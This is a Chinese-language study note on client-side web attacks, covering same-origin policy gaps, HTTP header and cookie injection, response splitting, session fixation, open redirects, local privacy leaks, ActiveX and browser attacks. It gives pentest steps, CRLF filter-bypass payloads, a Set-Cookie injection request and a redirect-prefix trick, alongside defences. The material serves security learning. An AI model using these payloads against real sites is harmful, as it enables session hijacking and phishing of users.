Javascript 中直接使用 XML 语法，同时还允许在 XML 中嵌入代码； 1var foo = &#x27;&lt;bar&gt;&#123; prompt(&quot;Please enter the value of bar&quot;) &#125;&lt;/bar&gt;&#x27;; 这种特性存在两个漏洞： XML 标签将被注释成为值，导致原本的逻辑失效； { } 块中的文本由于作为 javascript 代码执行，因此可用来对 XML 数据进行初始化； 攻击者可以适当的位置注入文本，插入任意的 {...} 块，用于捕获敏感数据； 防止 Javascript 劫持 使用令牌，进行 CSRF 防御； 在引用脚本中故意引入无效或有问题的 Javascript 代码（例如无限循环），从而破坏攻击者的引用；而实际的动态代码会使用 XMLHttpRequest 对问题脚本进行预处理，删除其中的问题代码； 使用 POST 请求来获得动态脚本代码，而不是传统的 GET 请求；这样可以避免攻击者使用 script 标签引用脚本； 同源策略深入讨论同源策略与浏览器扩展大多数浏览器扩展都会实施一定程度的同源策略，但是它们之间还是存在一些轻微的区别，有时候这种区别会引入一些不易察觉的漏洞； 同源策略与 FlashFlash 有个特性，即它的源是由加载 Flash 对象的 URL 所有在域决定的，而不是由加载 Flash 对象的 HTML 页面的 URL 决定的；例如在 A 网站的 HTML 页面，加载了 B 网站的 Flash 对象，则该 Flash 对象的源指向 B 网站；该 Flash 对象会与同一来源的对象或者后端进行交互，同时还可以调用浏览器的 URLRequest API 提出跨域请求（但不能读取响应）； Flash 有另外一个特征，即对象源可以通过发布策略文件，对来自其他域的 Flash 对象进行授权，以完成双向的交互；当某个来源于 A 网站 Flash 对象，尝试对 B 网站发起跨域请求时，浏览器会检查 B网站的策略文件，看是否接受来自 A 网站的请求； 策略文件一般放在根目录下的 crossdomain.xml 文件中 渗透测试步骤： 不管目标程序是否使用 Flash，都应该检查一下 crossdomain.xml 文件，因为通常在该文件中存放着跨域的策略；如果目标程序 A 有在该文件中向域 B 授权，那么来自域 B 的 Flash 对象有权与 A 进行交互； 如果文件中的策略为 allow-access-from domain=“*”，则意味着应用程序允许无限制的访问，任何其他站点都可以和应用程序执行双向交互，控制用户的会话，检索全部的数据，执行任何用户的操作； 如果应用程序允许子域与其进行交互，那么攻击者可以利用子域上可能存在的 XSS 漏洞，来与父域进行交互；如果子域能够付费播放攻击者的 Flash 广告，那么攻击者就可以用其设计过的 Flash 对象来实现交互，读取数据； 策略文件中可能包含内网的主机名等一些对攻击者非常有帮助的信息； 目前大多数 Web 程序都没有在 /crossdomain.xml 路径存放策略文件，开发者假设没有该文件意味着自动禁止所有的跨域访问。但实际上，Flash 浏览器的行为并不是这样的，当它在默认的顶级位置找不到策略文件时，如果有指定其他的下载 URL 路径，那么它会到该路径下面去寻找；当该路径的响应确实是一个 XML 格式的文件，并且在 content-type 消息头中也备注了是 XML 类型，那么浏览器就会接受该文件；这意味着，如果应用程序存在某个功能，允许用户上传文件到其域中，那么攻击者就可以先上传自定义的策略文件到应用程序中，然后在 Flash 对象中指定访问该上传路径，读取到其上传的策略文件，得到授权； 同源策略与 SilverlightSilverlight 的源认定跟 Flash 是一样的，那由加载对象的 URL 所在的域决定；但 Silverlight 有一点比 Flash 宽松，即它在源认定中不限制协议和端口，这意味着只要是相同域名就可以了，HTTP 还是 HTTPS 无所谓，不同端口号也无所谓； Silverlight 的跨域策略文件位置为 /clientaccesspolicy.xml，以下示例是微软家的： Flash 的潜在漏洞点，同样也适用于 Silverlight 同源策略与 JavaJava 的同源策略有一个特点，即在某些情况下，与来源域共享 IP 地址的其他域，将被视为“同源”；因此，如果有多个应用程序共享主机，会产生跨域交互的可能； Java 不限制一个域发布自己与其他域进行交互的策略； 同源策略与 HTML5XMLHttpRequest 一开始仅允许提出同源的请求，但 H5 引入了新的规则，使其可以和任意域进行交互，只要该域为当前访问提供了权限即可；权限控制通过 HTTP 消息头的多个字段来实现； 常规请求（使用现有 HTML 生成的请求，如表单），浏览器将直接发出请求，并检查响应，看是否允许后续的脚本读取该响应的内容； 非常规请求（非 HTML 生成的请求，如 JS ），浏览器先向目标 URL 提出一个 OPTIONS 请求，然后检查消息头，看权限如何设置，然后再决定是否发出该非常规请求（即发请求前，先做一个确认的动作）； 不管哪种情况，浏览器在提出请求时，都会在请求的消息头中，将 Origin 字段值设置为提出请求的域，以便目标 URL 的服务器能够依据该值，告知授权情况；服务器会在响应中的 Access-Control-Allow-Origin 字段中，指定其允许访问的来源域； 如果是 OPTIONS 确认请求，目标服务器还会返回更多的字段信息，以便进行更加精细化的权限控制，包括如下几个字段： 渗透测试步骤： 向目标应用程序发起一个包含 Origin 消息头的 XMLHttpRequest 请求，检查其响应，看看其中的 Access-Control 字段的值是如何设置的； 如果支持跨域访问，再发一个 OPTIONS 请求，检查其具体的规则； XMLHttpRequest 的这种跨域新特性引入了新的漏洞；假设攻击者知道目标程序使用 XMLHttpRequest 来发请求，并动态提取响应结果，插入到 HTML 页面中的某个位置；那么攻击者可以先插入一个指向自己控制的服务器的 URL，诱使用户进行点击；然后在自己的服务器上放上相应的恶意文件，等待用户点击后下载，被目标程序提取，插入到页面中； 通过代理服务合并域有些 Web 应用程序的功能，实际是在扮演中介的作用；当用户发出某个请求时，它实际上是去其他第三方网站搜索查询，处理后再展示用户，例如很多在线网页翻译程序，它允许用户提交一个网站的 URL，然后它会去抓取该 URL 页面的内容，并将其翻译成指定的语言； 由于翻译程序不会修改源网页的 HTML 标签和 JS ，这时候会出现一个有趣的现象，即对于浏览器来说，页面上的所有内容都隶属于应用程序，但页面内容中实际上包含着来自外部网站的代码；如果用户通过 GT 访问两个域的内容，对于浏览器来说，它们都属于 GT 域；因此，原来来自两个域的代码是不能相互访问的，但是由于现在它们都隶属于 GT 名下，因此，从某种意义上来说，它们变成了同源的，因此，彼此之间可以相互访问；假设其中一个域包含公开、无须登录即可访问的内容，那么攻击者就可以利用这种间接机制，实现跨域的访问； 其他客户端注入攻击HTTP 消息头注入如果应用程序某个功能使用用户的输入，做为某个消息头字段值的话，那么就可能存在消息头注入漏洞（尤其是当攻击者能够注入换行符时，就可以随心所意插入任意消息头了）； 常见的两个注入位置出现在 Location 和 Set-Cookie 字段，前者提取用户输入进行重定向，后者提取用户输入做为偏好存储（例如存储用户的界面语言选项）； 123456GET /settings/12/Default.aspx?Language=Enghtlish HTTP/1.1Host: app.comHTTP/1.1 200 OKSet-Cookie: PreferedLanguag=English... 利用消息头注入漏洞探查消息头注入漏洞的方法，跟探查 XSS 漏洞的方法类似，就是查找用户输入是否会出现在响应的消息头中； 渗透测试步骤： 如果用户输入会被提取到响应的消息头中，那么确认应用程序是否接受 URL 编码的回车符（%0d）或者换行符（%0a），以及它们是否会原样在响应中返回； 在确认换行是否在响应中注入成功时，应注意此时换行符不再以 URL 编码的形式出现了，而是被解码后的样子，即报文相应的位置正常应该出现换行； 如果响应中仅返回两个换行符的一个，仍然可以设计出有效的注入方法； 如果换行符被服务端净化了，那么还有如下几种方法可以进行尝试： foo%00%0d%0abar：添加一个 null 字节； foo%250d%250abar：对百分号进行编码； foo%%0d0d%%0a0abar：后端有可能没有使用递归； 在查看注入是否成功时，除了 HTML 源代码和浏览器插件后，还应使用专门的拦截工具，对响应消息头进行分析，确保注入成功，避免忽略了实际已经成功的可能； 注入 cookie假设目标程序存在 cookie 注入漏洞，则攻击者可以设计一个 URL，在参数中包含要注入的 cookie 值；当用户点击该 URL 后，目标程序会根据收到的请求，返回相应的 cookie 给用户的浏览器，从而实际注入的目的； 12345678// 专门设计的 URLGET /setting/12/default.aspx?Language=English%0d%0aSet-Cookie:+SessId%3d120a12f98e8; HTTP/1.1Host: app.net// 目标程序的响应HTTP/1.1 200 OKSet-Cookie: PreferedLanguage=EnglishSet-Cookie: SessId=120a12f98e8; // 此条为额外注入的 cookie 传送其他攻击当存在消息头注入漏洞，导致可以注入任意内容时，那么这个漏洞可以用来传送很多其他攻击； HTTP 响应分割当攻击者可以利用消息头漏洞，插入任意的内容时，那么有一种利用该漏洞的攻击方法称为 HTTP 响应分割，攻击者利用它创建一个木马页面，注入代理服务器的缓存中，等待管理员访问该页面，从而获得管理员的密码；过程如下： 攻击者利用注入漏洞，将木马页面做为第一个请求的消息头参数，并同时发第二个请求； 代理服务器收到两个请求，转发给应用程序； 应用程序收到两个请求后，生成两个响应； 代理服务器先收到第一个响应，由于注入的存在，该响应被代理服务器解析为两个响应； 其中第二个响应指向管理员登录页面，被代理服务器缓存（通过设置 If-Modified-Since 和 Last-Modified 两个字段，攻击者可以覆盖代理服务器上已存在的管理员登录页面）； 代理服务器收到应用程序的第二个响应，但由于前一个响应已经被解析为两个响应，当前收到的响应，对于代理服务器来说，相当于第三个响应，由于代理服务器判断之前的请求都已经获得响应，因此它会丢弃当前收到的响应； 管理员请求管理页面； 代理服务器发现缓存命中，在响应中直接返回缓存中的木马页面给管理员； 管理员输入密码，发送登录请求； 请求示例： 同时发送两个请求，在 HTTP 协议中，这样做是合法的 响应结果： 攻击者发送了两个请求，代理服务器也转发了两个请求，但由于响应分割，应用程序的第一个响应会被代理服务器解析为两个响应；之后应用程序的真正第二个响应会被代理服务器丢弃； 防止消息头注入漏洞防止的最好方法是不提取用户输入做为消息头的数据，如果实在要用，则需要采取以下措施： 输入确认：仅包含字母，最大长度为6字节； 输出确认：任何 ASCII 码小 0x20 的字符都应视为可疑字符，应拒绝包含该字符的请求； cookie 注入常见的 cookie 注入方式： 某些应用程序从请求参数中提取键值对，作为 cookie 值； 某些应用程序存在 HTTP 消息头注入漏洞，可利用该漏洞注入任意的 Set-Cookie 消息头； 某个目标域存在 XSS 漏洞，利用该漏洞设置一个 cookie，然后在该目标域父域或子域中使用； 利用主动中间人攻击（例如使用公共无线网络的用户）； 攻击者利用 cookie 达成攻击的方式： 某个特殊的 cookie 值可能会破坏应用程序的逻辑； 客户端代码通常直接信任并读取使用 cookie 值，很少加予过滤和净化，因此可以通过 cookie 来实现注入； 某些应用程序在 cookie 上放令牌，实现 CSRF 防御，攻击者可通过修改 cookie 来破坏这种防御； 攻击者通过 cookie 让用户登录自己的账号，下载其提前上传的攻击荷载； 设置任意 cookie，可利用会话固定漏洞； 会话固定漏洞某些应用程序在用户首次访问后，即为用户分配了一个匿名会话，等用户登录后，该会话保持不变，但权限升级；这里面存在一个漏洞，攻击者可以先访问应用程序，获得一个有效但无权限的会话，然后通过 cookie 注入漏洞，将该会话发给用户使用；一旦用户完成登录，攻击者拥有的这个会话的权限便直接升级了，从而实现了会话劫持； 只要会话跟用户信息相关，那么即使应用程序没有登录功能，攻击者也能够用会话固定漏洞来窃取用户信息；攻击者只需要先注入 cookie，然后等待用户在某个环节填写个人信息，保存在会话中以后，再用自己掌握的这个会话令牌，向应用程序发起请求，获得用户的个人信息； 有些应用程序很搞笑，它会直接接受用户提交的任意令牌，当检查发现该令牌不在自己的列表中时，会直接使用该令牌为用户创建一个新的会话；攻击者只需要制作一个令牌，然后通过网络任意的分发（如电子邮件），只要有用户点击，使用令牌发出请求，攻击者就可以实施劫持； 查找并利用会话固定漏洞存在固定会话漏洞的应用程序的常见特征： 应用程序向每个未验证的用户发布一个匿名令牌，并且在用户登录后，不发布新令牌，而是升级旧令牌（多数应用程序服务器的默认配置即是如此）； 应用程序不向未验证的用户发布匿名令牌，仅在用户登录后发布令牌；但是如果用户使用已有令牌和另外一名用户的密码登录，程序没有发布新令牌，而是使用旧令牌来存储新用户的会话； 以上两种情况，攻击者都可以通过注入自己获得的令牌，来劫持用户的会话； 渗透测试步骤： 通过任何可行的办法，获得一个有效的令牌； 访问登录页面，使用该令牌进行登录； 如果登录成功，且应用程序没有发布新令牌，则表示存在固定会话漏洞； 如果应用程序没有登录功能，但在某个阶段使用会话来保存用户的敏感信息，那么注意检查用户提交敏感信息的前后，其获得和使用的令牌是否发生了变化； 渗透测试步骤： 以完全匿名的用户身份获得一个会话令牌，然后完成提交敏感数据的步骤； 继续浏览，直到任何显示敏感数据的页面； 如果最初获得的令牌，现在可以用来访问显示敏感数据的页面，则表示应用程序存在漏洞； 如果发现漏洞，进一步检查应用程序是否接受并非它发布的令牌；如果接受，则意味着攻击者可以非常容易利用该漏洞； 防止会话固定漏洞任何时候，只要用户通过验证，应用程序就应该为用户发布一个新令牌；有些特别注重安全的应用程序，甚至使用单页面令牌，来提供深层的防御； 开放式重定向漏洞如果应用程序提取用户的输入，作为重定向的数据，那么应用程序可能存在开放式的重定向漏洞；攻击者可以使用该漏洞进行钓鱼攻击，引导用户到攻击者控制的目标页面；由于这个页面是通过重定向到达的，普通用户往往不会对其产生怀疑； 查找并利用漏洞检查应用程序所有的重定向响应，一般有以下几种常见的做法： 使用 3XX 状态码和 Location 字段； 使用 Refresh 消息头，并设置时间间隔为 0，这样就可以立即触发，实现类似重定向的效果； 使用 HTML 中的 meta 标签，来复制消息头的行为，从而实现重定向的效果； 问：meta 标签的用途？ 答：HTML 有一些用来表示页面元信息的标签，例如 base, link, script, style, title 等；如果有些元信息无法使用已有的元标签进行表示，则使用 meta 来表示，相当于“其他”； 使用 Javascript 的 API 来实现重定向 渗透测试步骤 使用拦截器检查应用程序中所有使用了重定向的位置； 分析每个重定向使用了什么样的方法； 绝大多数的重定向是不受用户控制的，有一个常见的场景是用户浏览到某个页面时，应用程序要求用户进行登录，此时应用程序会重定向的登录页面；然后在用户登录后，应用程序会重定向跳回之前中止浏览的页面（开发者经常将目标页面的URL 放在请求参数中）； 渗透测试步骤： 如果用户提交的数据，在重定向的绝对 URL 中出现，则尝试修改 URL 中的域名，看应用程序是否会对新域名发起访问，重定向到新域名； 如果用户提交的数据，在重定向的相对 URL 中出现，也将其改为另外一域名，然后观察应用程序的反应； 如果响应出现以下行为，则说明漏洞存在： 有些应用程序允许用户指定 URL，然后应用程序会加载该 URL 指向的内容，到当前页面的 iframe 中；虽然它不是严格意义上的重定向漏洞，但是二者很类似，攻击者可以同样加予利用； 为了阻止重定向攻击，开发者会对用户的输入进行净化和过滤，一般有如下两种常见的机制： 阻止绝对 URL应用程序检查用户的输入是否以 http 开头，此时可尝试通过对 http 进行混淆，看是否能够避开过滤 应用程序检查并删除 http 字样，此时可尝试添加多个 http；若应用程序没有递归净化，则可能避开 应用程序检查 URL 是否包含自己的域名，则攻击者可以在其控制的域名中添加应用程序域名作为子域名或路径 附加绝对前缀应用程序开发者可能会在用户的输入前面，添加一个指向自己域名的前缀，来避免重定向漏洞；这种方法不错，但是有个前提，即开发者添加的前缀一定要有斜杠作为结束，不然攻击者仍然有机会操控该 URL 的结果 12&lt;!--假设开发者添加的固定前缀为 http://app.net，则攻击者将输入设计为 .attacker.net，则最终结果变成了如下--&gt;http://app.net.attacker.net 有些重定向的动作并不是由服务端的响应来发起的，而是由前端的 js 代码直接提取用户输入来生成的，此时应仔细检查前端 js 代码的逻辑，看其是否存在漏洞；常见的 js 重定向 API 如下： document.location document.URL document.open() window.location.href window.navigate() window.open() 防止开放式重定向漏洞避免提取用户的输入生成重定向目标，是防御重定向漏洞的根本办法；有些开发者使用一个通用的重定向页面 + 目标 URL 参数来实现重定向，比较好的替代办法如下： 使用直接指向目标页面的 URL，避免使用重定向页面进行跳转； 使用列表，参数只传索引即可，而不是传送目标 URL； 如果一定要将用户的输入合并到 URL 中的话，应该采取如下措施： 使用相对 URL 作为输入；严格检查，不要尝试进行净化；确保输入以斜杠+字母开头，或者直接以字母开头，其他情况通通拒绝； 如果用户提交的 URL 不必斜线开头，则添加前缀时务必添加斜线； 避免使用前端 JS 代码来实现重定向，因为这部分代码不可控制，而且其逻辑完全暴露在了攻击者面前； 客户端 SQL 注入 HTML5 支持客户端使用 SQL 数据库，应用程序可以客户端存储数据，并使用 js 进行访问；此特性有助于客户端的功能实现离线工作； 当使用 SQL 数据库时，不管是客户端还是服务端，都可能存在 SQL 注入的漏洞，常见的易受攻击的应用程序： 社交网络程序：将用户的联系人存储在本地数据库中； 新闻应用程序：将文章和用户评论存储在本地数据库中，以便离线查看； Web 邮件程序：将电子存储在本地，以便离线状态下能够正常工作，并将写好的邮件在上线后进行发送； 如果攻击者实现了 SQL 注入，就可以查询用户本地数据库中的数据，并进行提取发送给攻击者； 客户端 HTTP 参数污染攻击者通过针对性的设计 HTTP 请求参数，可以利用服务端应用程序的逻辑，同样，这种做法也可以用于破坏前端的逻辑；漏洞的前提是服务器会提取攻击者的输入，并将其用于生成 URL 的参数，此时攻击者就有机会向 URL 中注入一些额外的参数，破坏该 URL 原本的逻辑； 本地隐私攻击在某些场景下，例如网吧，同一台计算机会被很多用户共用使用，并且他们很可能会访问同一个应用程序，因此，攻击者此时有机会访问受害者使用的同一台计算机； 应用程序会在本地存储一些用户的敏感信息，为了检测存储了哪些信息，最好的办法是使用虚拟机，因为虚拟机里面是一个干净的操作系统和浏览器，很容易找到目标数据； 另外，有时候应用程序存储的数据可能会设置为隐藏模式，因此，需要在文件系统的选项中，将所有隐藏文件显示出来，以方便查找； 持久性 cookie多数浏览器支持持久性 cookie 的功能，并将这些 cookie 值保存在本地文件系统中；一些应用程序会使用该功能保存敏感数据； 渗透测试步骤 在解析应用程序的环节中，特别注意带有 set-cookie 指令的响应，如果其中包含 expire 属性，则该 cookie 值将被保存，直到过期； 如果某个持久性的 cookie 中包含敏感数据，由于攻击者能够使用同一台电脑，因此攻击者能够马上获取该 cookie 中的数据。例如直接使用 cookie 中的令牌，无须破译其中的内容，以受害者的身份访问应用程序； 缓存 Web 内容大多数浏览器默认会将非 SSL 页面的内容保存在缓存中，并存储在本地文件系统中，除非应用程序有在响应中明确要求不要保存； 渗透测试步骤 检查服务器的 HTTP 响应内容，查看其中的缓存指令； 禁止缓存的相关指令包括： Expires: 0 Cache-Control: no-cache Pragma： no-cache 如果响应中没有这些指令，那么内容正常都会被浏览器缓存； 使用虚拟机中操作系统默认安装的干净的浏览器，清除所有缓存和cookie，然后访问包含敏感数据的应用程序页面； 检查新增的缓存文件，看其中是否包含敏感数据； 如果新增的缓存文件很多，则提取一个页面字符串，在缓存中进行搜索定位； 不同的浏览器默认的缓存目录不同，应根据情况在不同的位置进行查找； 浏览历史记录多数浏览器都会保存用户的浏览记录，而某些浏览记录对应的请求，可能使用 GET，因此该请求的参数中，很可能包含有敏感数据； 渗透测试步骤 解析应用程序时，注意通过 URL 参数传送敏感数据的所有情况； 如果存在以上情形，查看浏览器的浏览记录，看这些敏感数据是否出现在其中； 自动完成很多浏览器提供自动完成的功能，该功能会保存用户名、卡号、密码等敏感数据，并将数据存储在本地文件系统中；这些数据可被攻击者访问的同时，还有可能被 XSS 攻击获取（伪表单，诱使用户触发自动完成功能）； 渗透测试步骤 解析应用程序中，确定包含表单的源代码位置 如果表单的标签未设置 autocomplete=off，则用户输入的数据将被浏览器默认保存在本地（如果浏览器选项已经设置开启自动完成功能的话）； Flash 本地共享对象Flash 有自己的存储机制，更有意思的是，它可以跨浏览器共享数据，只要它们都安装了相同的 Flask 插件即可； 渗透测试步骤 有些现成的插件（如 BetterPrivacy）可浏览由用户应用程序创建的 Flash 本地共享对象； 不同的浏览器默认的存储位置不同，根据情况，可打开对应的文件夹，直接查看其中的原始 Flash 存储内容； Silverlight 独立存储Silverlight 跟 Flash 一样，也有使用自己的独立存储 渗透测试步骤 不同的浏览器默认的存储位置不同，根据情况，可打开对应的文件夹，直接查看其中的原始存储内容 IE userDataIE 也有自己的本地存储机制，称为 userData，同样可以直接查看其中的原始存储内容，一般在以下路径 HTML5 本地存储H5 引入了一些新的存储机制，包括 会话存储 本地存储 数据库存储 由于 H5 的规范还在完善中，因此其存储位置可能会动态变化，应根据浏览器支持的 H5 版本而定； 防止本地隐私攻击 应避免将敏感数据存储在持久性 cookie 中 应用程序应使用合适的禁止缓存指令，避免浏览器敏感数据保存在本地； 杜绝使用 URL 参数传递敏感数据，而应使用 POST 方法； 在用户输入敏感数据的表单位置，应添加 autocomplete=off 属性，以避免自动完成功能记录用户输入的敏感数据； 如果需要在本地存储敏感数据，应该对这些数据进行加密，以防止攻击者直接访问； 告知用户存储风险，以便需要时，用户可以禁用该功能； 攻击 ActiveX 控件 ActiveX 是一个很有意思的技术理念，由于很多软件背后存在一些通用的功能，因此如果每个软件如果都需要就这些通用功能进行编写的话，显然是一种重复的工作，尤其是跨语言的情况（相同语言内部，可以使用导入第三方模块来解决）；为了让不同语言编写的功能，能够实现复用，微软发明了 ActiveX 技术，它本质上是一种接口规范，各应用程序将可供外部调用的功能，按该规范进行编写，则 Windows 操作系统上的其他程序，就可以对其进行调用，而无须打开源应用程序； ActiveX 控件是专指 Active 理论在 IE 浏览器上的应用，IE 浏览器通过 ActiveX 控件，可以实现对本地其他应用程序功能的调用，例如本地视频播放器、Flash 播放器、Office 软件等，这样可以大大加强 IE 本身可以提供的功能，让 IE 可以直接处理原本它处理不了的文件，给用户提供更好的浏览体验； 不同的应用程序在 IE 中有不同的 ActiveX 控件，用户可以根据需要进行安装；当安装了某个 ActiveX 控件后，该控件就会在浏览器中运行，当用户需要打开或播放某个该控件支持的文件时，该控件就会向操作系统调用本地应用程序，处理该文件，并将结果返回给 IE 浏览器；ActiveX 控件相当于充当了 IE 浏览器和本地应用程序之间的桥梁； 开发者在 HTML 源代码中，指定某个 ActiveX 控件的调用，并传递相应的参数；IE 浏览器在解析 HTML 时，将根据控件 ID，调用该控件，并传递相应的参数，之后的工作将由 ActiveX 控件接手处理； ActiveX 控件的优点在于其提供了强大的灵活性，因此能够带来很好的协同效果，但这是一把双刃剑，其功能越强大，意味着攻击者越有机会利用它来实现攻击目标，而绝大多数用户是缺少安全意识的，因此完全无法保护好自己；更糟糕的是， ActiveX 没有像 Java Applet 控件一样使用沙箱技术，一旦用户安装了某个 ActiveX 控件，该控件将成为了操作系统的一部分，具备很大的权限； ActiveX 控件技术仅在 IE 浏览器中被支持，其他家的浏览器都不支持，安全起见，普通用户最好禁用该功能； 查找 ActiveX 漏洞如果一个网站使用了 ActiveX 控件，则在其网页的源代码中，将出现调用或下载安装该控件的相关代码，示例如下： classid 参数用来标识控件的全局 id；codebase 参数用来标识控件下载地址； 在首次安装的时候，浏览器会弹出警告，要求用户确认控件的可信性；一旦用户点击确认后，该控件即被安装并标记为“脚本执行安全”；由于控件是全局的，这意味着，随后其它网站也可以调用该控件，调用方式如下： 渗透测试步骤： 当发现网页上使用 ActiveX 控件时，一种探测该控件是否存在漏洞的方法为修改调用该控件的代码，替换提交给控件的参数，观察控件的执行结果； 探查是否存在缓冲区溢出漏洞（详见第 16 章的描述）； 查看 ActiveX 的方法，是否为一些高风险的方法，例如 LaunchExe 等； 页面上的源代码常常并没有调用控件中的所有方法，因此，可以通过一些第三方工具，例如 COMRaider，枚举出控件的所有方法； 防止 ActiveX 漏洞ActiveX 控件本质上是一个编译软件，如果阻止这种类型的软件受到攻击，是一个很大很复杂的课题。主要有以下一些注意事项： 发布控件前应进行审查，确保不存在缓冲区溢出之类的漏洞； 任何读取用户输入，并调用文件系统或操作系统的方法，都必须是私有方法，不得对外暴露； 可考虑增加域名确认，仅限特定域名列表中的域名，发起对控件的调用； 可考虑增加参数签名，对所有发给控件的参数，进行签名；如果签名无效，则拒绝调用； 攻击浏览器同应用程序一样，浏览器本身也是一个应用程序，因此其也不可避免存在漏洞；攻击者如果能够发现并浏览器的漏洞，就可以攻破所有的网站，而不单单是存在漏洞的网站； 记录键击当浏览器窗口获得焦点时，JS 脚本可以获取所有键盘输入，因此攻击者通过键击劫持，可以捕获用户输入的敏感数据； 一种攻击方法是攻击者在页面的 iframe 注入其设计的脚本，捕获用户的键盘输入，并将该输传递给顶层标签，同时在用户输入暂停时，暂时放弃激活状态，这样可以用户的输入仍然能够出现在顶层窗口中，并且光标也会处于闪烁的状态，实现在用户在毫无知觉的情况下，捕获其输入； 窃取浏览器历史记录与搜索查询这个很有意思，攻击者通过 JS 代码，动态创建很多常用站点的链接，以及一些常用的搜索关键字，注入在网页中；如果用户最近访问过这些站点，或者执行过相关的查询，浏览器将根据最近的浏览记录，将相应的链接标记为已访问的颜色（与未访问过的链接颜色有所不同），之后，攻击者再使用 JS 代码中的 getComputedStype 函数，查询其创建的链接的颜色样式，即可获知哪些链接是用户最近访问过的； 获知用户登录过的应用程序攻击者枚举其想攻击的应用程序，向这些应用程序的某个受保护页面（需登录才能访问的页面）发送请求；虽然攻击者并不能访问目标应用程序返回的响应内容，但是如果这些页面不能被访问，那么目标应用程序会发送错误消息，或者发送重定向地址，此时攻击者通过提前设计好的错误处理函数，即可获知其发送的请求的状态，进而知道哪些网站是用户登录过的；根据获得的已登录的清单，攻击再有针对性的设计跨站点请求伪造，提高攻击效率； 端口扫描攻击者可以利用 JS 代码，先确定用户主机的 IP 地址，得到本地网络的 IP 范围，然后对任意 IP 地址和端口发送请求，以测试其连通性；虽然同源策略可以阻止 JS 代码读取请求的响应，但是 JS 能够检测到请求错误或者未收到请求。通过这种方式，攻击者即可知道本地有哪些主机及相应的端口是可供访问的，为下一步攻击做准备； 攻击本地网络其他设备当获知本地可访问的主机和端口后，攻击者接下来可以有针对性的做进一步探查。例如运行定制化的脚本和错误处理函数，尝试获取可访问主机上的某个常用内容；如果该内容存在，错误函数未被触发，说明该主机符合某种预设的类型；之后，再利用该类型设备的已知漏洞，对其进行攻击；例如尝试使用默认密码进行登录等； 如果攻击者能够控制路由器，那么就可以通过设置 DNS 重新绑定，来避开同源策略的限制，从而能够实施跨站点脚本攻击，获取目标应用程序的响应内容； 利用非 HTTP 服务同一台机器上，可能在不同的端口运行着一些非 HTTP 服务，可能是为了兼容性考虑，大多数非 HTTP 服务都接受意外的输入，有些服务甚至接受 HTTP 消息头，并对其进行处理；如果发生这种情况的话，攻击者就可以在消息主体中发送该非 HTTP 服务可识别的二进制内容（HTTP 协议可用来发送任意内容的消息主体） 如果该非 HTTP 服务本身存在已知的漏洞，则攻击者就可以加以利用；甚至，攻击者还可以利用该非 HTTP 服务为跳板，对运行同一服务器上的 Web 应用程序发起请求，进行攻击； 要实现这种攻击，需要满足如下一些条件： 非 HTTP 服务使用的端口未被浏览器禁止； 非 HTTP 服务接收 HTTP 消息头； 非 HTTP 服务会在其响应中回显一部分请求内容； 浏览器接收不包含有效 HTTP 消息头的响应，并且将部分响应内容做为 HTML 处理（出于兼容性考虑，正常会处理）； 浏览器在处理 cookie 时，会忽略端口号（正常会忽略）； 利用浏览器漏洞如果用户安装的某个版本的浏览器或者浏览器扩展存在已知的漏洞，则攻击者就可以利用该漏洞，例如利用 Java Applet 扩展中的已知漏洞，与本地计算机或者其他非 HTTP 服务进行二进制通信；攻击者可以利用该通信渠道，对端口进行扫描，发现其他存在的服务，并进一步利用该服务存在的已知漏洞； DNS 重新绑定这个有点意思，工作原理如下： 攻击者在其控制的服务器上放置恶意脚本； 在 DNS 域名服务器上，攻击者将其域名解析配置到上一步包含恶意脚本的服务器，并将 TTL 时间配置很短，以避免其解析被缓存； 当受害者访问攻击的网站时，会自动下载恶意脚本到本地； 该恶意脚本会向攻击者的网站再发送一次请求，由于 TTL 存放时间很短，浏览器因此再次向 DNS 域名服务器提交解析请求； 此时攻击者将 DNS 域名解析配置修改为目标应用程序的 IP； 浏览器获得目标应用程序的 IP，但却误以为是攻击者控制的域名的 IP，并向其发出请求； 该请求将被目标应用程序接收并处理和返回响应； 浏览器收到响应后，误以为是攻击者的域返回的响应，因此恶意脚本可以读取该响应的内容，并发送给攻击者； 借助浏览器框架针对 XSS 漏洞的攻击，市面上已经有很多成熟的浏览器攻击框架，用来演示如何利用这种漏洞进行攻击；这意味着当攻击者发现漏洞后，可以直接利用这些现成的框架，发起攻击；这些框架会利用已知的 XSS 漏洞，注入 JS 恶意脚本，定期向攻击者控制的服务器发送其收集到的数据，并可以接收攻击者发送的指令； 这些框架提供以下常用的功能： 记录用户的键击，并发送给攻击者； 劫持用户的会话； “指纹”识别用户使用的浏览器（攻击者可针对性的利用该浏览器的已知漏洞）； 对用户私有网络中的其他主机进行进行端口扫描，并将结果发送给攻击者； 通过用户的浏览器发送恶意请求，向其他 Web 应用程序实施攻击； 蛮力攻击用户的浏览历史记录，并将结果发送给攻击者； 攻击框架 BeEF 的使用示例： 另一款功能强大的框架是 XSS Shell，可注入任意的 JS 代码，即使用户已经跳转到应用程序的其他页面，它还会驻留在用户的浏览器中； 中间人攻击攻击者通过中途拦截并更改网络请求来实施攻击，例如在无线公共热点和共享办公网络的场景中；很多 Web 应用程序仅在部分包含敏感数据的页面使用 HTTPS 来加密传输，而不是所有的连接都是加密的，这就为中间人攻击者创造了机会，尤其是当非加密页面使用绝对 URL 来引用脚本文件的话；攻击者可以替换这些脚本文件，注入恶意代码，实现攻击目的； 由于同源策略的存在，虽然攻击者更改了引用脚本的 URL 地址，但是此时该页面是在 HTTP 下传输的，新脚本文件中的代码，并无法访问原程序通过 HTTPS 协议传输的内容；接下来攻击者需要修改某个 HTTP 响应，构建重定向，让浏览器将 HTTP 切换为 HTTPS 并加载同一页面（或者在其他响应中改写页面上的 URL，让用户在不知情的情况下，点击改写后中的 URL）； 此处有疑问：为什么浏览器不是使用 HTTPS 响应返回的页面中的脚本，而不是使用原 HTTP 响应返回的页面中的脚本？待后续做实验进行验证 即使应用程序不使用未加密的 HTTP 传输内容，攻击者仍然可以修改用户访问其他非加密域的请求，并返回重定向的响应，该响应将诱使用户的浏览器向目标应用程序发起 HTTP 请求，然后攻击者拦截该请求，并返回任意的内容（此时即使应用程序的服务端都不监听 80 端口也不起作用，因为请求根本就没有到达应用程序的服务器）；接下来攻击者可以使用以下攻击技巧来攻击应用程序的 HTTPS 传输： 当拦截到用户浏览器向目标程序发出的非加密 HTTP 请求后，攻击者通过拦截并返回自定义的响应，修改用户的 cookie 值（不管用户之前是否已经通过 HTTPS 收到了 cookie 值，都会被修改）；如果该 cookie 被原程序的代码以不安全的方式进行处理，例如存在读取 cookie 的 XSS 漏洞，那么攻击者通过针对性的设计 